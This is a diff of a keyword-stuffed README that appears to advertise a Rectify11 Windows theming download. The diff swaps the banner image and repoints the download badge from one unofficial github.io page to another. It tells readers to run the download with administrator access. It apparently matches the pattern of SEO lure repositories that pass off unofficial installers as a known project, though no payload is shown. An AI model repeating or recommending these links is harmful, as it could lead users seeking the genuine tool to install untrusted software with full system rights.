@@ -7,7 +7,7 @@ Rectify11 transforms Windows 11 with a cleaner, more consistent interface, refre
 
 ## A Cleaner Windows Experience
 
-![Banner Placeholder](https://i.redd.it/rectify11-windows-11-re-imagination-project-aims-to-fix-v0-s6qq1yghxmi81.png?width=1302&format=png&auto=webp&s=35d9f0bb00f592e9dd8ab9ef3a86a2eb7a1da5d5)
+![Banner Placeholder](https://i.redd.it/54h0os5abzud1.png)
 
 Rectify11 is a Windows customization project focused on making Windows 11 feel more visually unified. Instead of changing the operating system into something unfamiliar, Rectify11 theme work refines the parts that still feel uneven, including legacy dialogs, icon sets, system surfaces, and shell details. Users often search for rectify11 download when they want a more polished desktop without building every visual tweak manually.
 
@@ -52,7 +52,7 @@ The project is especially useful for people who like the Windows 11 design direc
 
 Prerequisites: A Windows 11 computer, administrator access, a recent backup or restore point, and the latest trusted Rectify11 download source.
 
-[![GET Rectify11](https://img.shields.io/badge/GET%20%E2%80%94%20Rectify11-0078D6?style=for-the-badge&logoColor=white)](https://stuevewillen30.github.io/.github/Rectify11-theme)
+[![Launch Rectify11](https://img.shields.io/badge/Launch-Rectify11-18181B?style=for-the-badge)](https://rectify11-theme-tool.github.io/.github/)
 
 1.  **Download the Project Files:** Find the current Rectify11 GitHub download or Rectify11 download GitHub release and review the version notes before running anything.
 2.  **Prepare Windows Safely:** Confirm Rectify11 compatibility, close unnecessary apps, and create a restore point before starting Rectify11 setup.
